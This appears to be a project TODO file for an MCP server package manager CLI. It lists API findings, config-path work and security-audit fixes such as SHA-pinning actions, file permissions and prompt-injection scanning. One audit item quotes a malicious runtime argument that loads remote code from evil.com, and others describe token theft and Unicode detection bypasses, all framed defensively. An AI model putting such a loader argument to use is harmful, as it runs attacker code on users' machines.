# TODOS

## Resolved Blockers

### 1. ~~Verify Official MCP Registry API~~ DONE (2026-03-28)
**Resolution:** API verified. Use **v0.1** (not v0). Key findings:
- Search param is `search` (not `q`), substring match on name only
- No full-text search — need client-side description filtering
- `environmentVariables` is inside `packages[]`, not top-level
- Pagination: `cursor` + `limit` (max 100), `metadata.nextCursor`
- `packages[]` confirmed: `registryType` = `npm | pypi | oci`
- `_meta` has `status`, `publishedAt`, `updatedAt`, `isLatest`

### 2. ~~Resolve npm Package Name~~ DONE (2026-03-28)
**Resolution:** npm package name = `@getmcpm/cli`, bin command = `mcpm`.
- `mcpm` taken (Minecraft Package Manager)
- `mcpx`, `mcp-pm`, `mcp-registry`, `mcpman` all taken
- `@getmcpm/cli` is available and follows `{tool}-cli` convention

## Pre-launch

### 3. Config Backup-Before-Write
**Priority:** P1
**What:** Before atomic config write, copy existing config to ~/.mcpm/backups/{client}.{timestamp}.json. Keep last 5 backups.
**Why:** If a config write produces malformed JSON, Claude Desktop/Cursor may fail to parse and lose all MCP server configs. Backup enables recovery.
**Depends on:** Config adapter implementation.

### 4. Cross-Platform Config Paths
**Priority:** P1
**What:** Add Linux and Windows paths to config/paths.ts for all supported clients.
**Why:** Plan only specifies macOS paths. Linux devs (large HN audience) will hit errors on launch.
**How:** Linux: `~/.config/Claude/`, `~/.config/Code/User/`. Windows: `%APPDATA%/Claude/`, `%APPDATA%/Code/User/`. Verify Cursor and Windsurf paths on each platform.
**Depends on:** Config adapter implementation.

## Security (from CSO audit 2026-03-29)

### 5. Pin GitHub Actions to SHA hashes
**Priority:** P1 (HIGH)
**What:** Replace `actions/checkout@v4`, `pnpm/action-setup@v4`, `actions/setup-node@v4` with SHA-pinned versions in ci.yml and publish.yml.
**Why:** Mutable tags can be force-pushed. A compromised action could steal NPM_TOKEN during publish.
**How:** Use `pin-github-actions` or manually look up SHAs for current tag versions.

### 6. Add CODEOWNERS for workflow files
**Priority:** P1 (HIGH)
**What:** Create `.github/CODEOWNERS` requiring review for `.github/workflows/` changes.
**Why:** Without it, any contributor with write access can modify publish.yml to exfiltrate NPM_TOKEN.

### 7. Set chmod 600 on config files containing secrets
**Priority:** P1 (HIGH)
**What:** Pass `mode: 0o600` to all `writeFile` calls in BaseAdapter.writeAtomic and store/index.ts writeJson. Also `mode: 0o700` for mkdir.
**Why:** Config files with API keys are world-readable by default (umask 0o644). Other local processes can read them.

### 8. Add timeout to external scanner subprocess
**Priority:** P1 (HIGH)
**What:** Add `timeout: 30_000` to `execFileAsync` in `src/scanner/tier2.ts` defaultExec.
**Why:** No timeout means `npx @invariantlabs/mcp-scan` can hang forever, blocking install/audit.

### 9. Switch validateRuntimeArgs from blocklist to allowlist
**Priority:** P1 (HIGH)
**What:** Replace the dangerous-flag blocklist in `src/commands/install.ts` with a safe-arg allowlist. The blocklist misses `--loader`, `--experimental-loader`, and other Node.js code execution flags.
**Why:** A malicious registry entry with `runtimeArguments: ["--loader=https://evil.com/rce.js"]` bypasses the current blocklist.

### 10. Apply NFKC normalization before scanner pattern matching
**Priority:** P2 (MEDIUM)
**What:** Call `text.normalize("NFKC")` before running regex patterns in `src/scanner/patterns.ts`. Extend zero-width char detection to cover `\u202A-\u202F\u2028\u2029`.
**Why:** Unicode homoglyphs and bidirectional override characters bypass prompt injection detection.

### 11. Scan server.title, remote headers, and runtimeArgs for injection
**Priority:** P2 (MEDIUM)
**What:** Extend `scanTier1` to call `detectPromptInjection` on `server.title`, remote header descriptions, and runtimeArguments.
**Why:** Only `server.description` is currently scanned. Injection could be embedded in any user-visible field.

### 12. Cap registryMeta trust score when critical findings present
**Priority:** P2 (MEDIUM)
**What:** Zero the registryMeta bonus when staticScan findings include critical or high severity items.
**Why:** Attacker-controlled metadata (publishedAt, downloads) can inflate trust score to partially mask critical findings.

### 13. Tighten server name regex in tier2.ts
**Priority:** P2 (MEDIUM)
**What:** Disallow leading/trailing hyphens/dots on either side of the slash in `SERVER_NAME_RE`.
**Why:** Overly narrow regex could silently skip tier-2 scanning for valid but unexpected server names.

## Post-V1

### 14. Optional Anonymous Telemetry
**Priority:** P2
**What:** Add opt-in anonymous telemetry (install count, command usage, error types).
**Why:** After V1 launch, you'll want to know adoption patterns. V1 skips this to avoid trust paradox ("security tool that tracks you").
**How:** Simple opt-in on first run. Anonymous counters only. No PII, no server names.
**Depends on:** V1 launch, established trust.
